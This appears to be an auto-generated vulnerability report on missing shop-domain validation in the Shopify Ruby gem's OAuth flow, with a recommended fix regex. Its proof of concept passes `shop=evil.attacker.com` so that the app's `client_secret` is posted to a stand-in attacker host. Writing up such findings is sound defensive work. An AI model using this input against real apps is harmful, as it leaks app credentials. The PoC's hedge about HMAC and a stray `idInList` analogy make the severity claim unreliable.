Confirmed: there is no shop-domain format validation (e.g. `*.myshopify.com` regex) anywhere in `lib/shopify_api/auth/oauth.rb` or `lib/shopify_api/auth/oauth/auth_query.rb` — the only matches for `myshopify`/shop-validation patterns were in unrelated generated REST resource tests, which are out of scope. The `shop` value flows unvalidated from `begin_auth` straight into `auth_base_uri`, and from `validate_auth_callback` straight into the access-token POST target.

### Title
Missing shop-domain validation allows SSRF exfiltration of `client_secret` to an attacker-controlled host - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request target directly from `auth_query.shop` without validating that it is a legitimate `*.myshopify.com` domain, sending the app's `client_secret` to whatever host that value resolves to.

### Finding Description
`validate_auth_callback` computes `auth_base_uri(shop)` as `"https://#{shop}/admin"` [1](#0-0)  and then POSTs the OAuth body — which includes `client_secret: Context.api_secret_key` — to `#{auth_base_uri}/oauth/access_token` via `Clients::HttpClient` [2](#0-1) . The `shop` value used here comes straight from `auth_query.shop`, which is only checked via HMAC and state-cookie matching [3](#0-2) ; there is no independent validation anywhere in the gem that `shop` matches a `*.myshopify.com` (or configured custom domain) pattern before it is used to construct the URL that receives the `client_secret`. Likewise, `begin_auth` interpolates the caller-supplied `shop` argument directly into `auth_base_uri` with no format check [4](#0-3) .

This is the direct analog of the reported bug class: the value acted upon (the host that receives the `client_secret`) is not the same value that is actually bound/validated — the gem trusts `shop`/`host` as an opaque string rather than checking it belongs to the Shopify domain space it is meant to represent, exactly like `idInList` not being kept in sync with the entity it is meant to identify. The equality that should hold — `shop_used_to_build_token_exchange_url == validated_myshopify_domain` — is never enforced; only `hmac(shop, ...) == computed_hmac` and `state_cookie == auth_query.state` are checked, neither of which constrains `shop` to a Shopify-owned host.

### Impact Explanation
If a host application passes an attacker-influenced `shop` parameter (e.g., from the install-initiation request, which is entirely unauthenticated at this stage) through to `begin_auth`/`validate_auth_callback` without its own domain allow-listing, the OAuth completion step will send the app's `client_secret` to a server the attacker controls. This is a direct SSRF carrying the app's credentials and can lead to full compromise of the app's `client_secret`, matching the "SSRF with the app's credentials" High-impact criterion.

### Likelihood Explanation
The `shop`/`host` parameters at `begin_auth` time are attacker-supplied on the very first, unauthenticated request (`?shop=...`), and the gem provides no built-in guard rail. Many integrating apps rely on this library to be the safety net for OAuth handling, per the gem's own docs describing it as facilitating "session creation" and the OAuth flow [5](#0-4) , so absence of shop-domain validation here is a realistic, easily reachable gap.

### Recommendation
Add and enforce a `shop` domain validator (e.g., `/\A[a-zA-Z0-9][a-zA-Z0-9\-]*\.myshopify\.com\z/`, with an explicit opt-in list for custom domains) inside `begin_auth` and `validate_auth_callback`/`auth_base_uri`, rejecting any `shop` value that doesn't match before constructing the authorize URL or the access-token exchange URL that will carry `client_secret`.

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/auth/callback")` using an unauthenticated request parameter (typical integration pattern shown in `docs/usage/oauth.md`).
2. Attacker requests `/install?shop=evil.attacker.com`.
3. `auth_base_uri("evil.attacker.com")` returns `"https://evil.attacker.com/admin"` [1](#0-0) , and the resulting authorize redirect points at the attacker's server.
4. If the attacker's server echoes back a plausible callback (code/state/hmac it can compute if it controls the flow, or if the app trusts the callback), `validate_auth_callback` will POST `client_id`/`client_secret`/`code` to `https://evil.attacker.com/admin/oauth/access_token` [6](#0-5) , leaking the app's `client_secret` to the attacker.
